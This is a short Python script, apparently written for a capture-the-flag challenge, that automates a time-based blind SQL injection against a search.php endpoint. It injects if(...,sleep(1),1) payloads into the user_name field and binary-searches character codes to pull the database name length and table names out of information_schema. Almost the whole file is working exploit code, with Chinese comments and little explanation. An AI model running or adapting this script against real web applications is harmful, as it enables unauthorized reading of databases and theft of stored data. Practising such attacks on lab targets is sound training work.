import requests
import time





def dichotomy(target,raw_data,left_lenth=1,right_length=126):
    result = ''

    #psot 类型的修改版本


    while left_lenth < right_length:
        data = {}
        data['phone'] = raw_data['phone']
        print('raw_data:',raw_data)
        target_length = int((left_lenth+right_length)/2)
        data['user_name'] = raw_data['user_name'].replace('目标',str(target_length))
        # if 
        start_time = time.time()
        print(data)
        r = requests.post(url=target,data=data)
        r.url
        end_time= time.time()
        if end_time-start_time >= 1:
            left_lenth = target_length+1
            
        else:
            right_length = target_length
        print('小',left_lenth,'大',right_length)
        if left_lenth >= right_length:
            result = left_lenth
            break
    return result



url = 'http://8a81c5e6-5bce-4099-9e48-b44dab8daa23.node3.buuoj.cn/search.php'

# data = {
#     'user_name':"kkp'='1' && if((length(database())>目标),sleep(1),1)#",
#     'phone':'1'
# }

data = {
    'user_name':"kkp'='1' && if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),'+str({})+',1))>目标),sleep(1),1)#",
    'phone':'1'
}


print('开始运行')
# print('长度为：',dichotomy(url,data))
# 数据库长度为：8

result_database = ''
for x in range(1,9):
    data = {
    'user_name':"kkp'='1' && if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),'"+str(x)+"',1))>目标),sleep(1),1)#",
    'phone':'1'
    }
    result_database += chr(dichotomy(url,data))
    # print(data)
print('数据库名为：',result_database)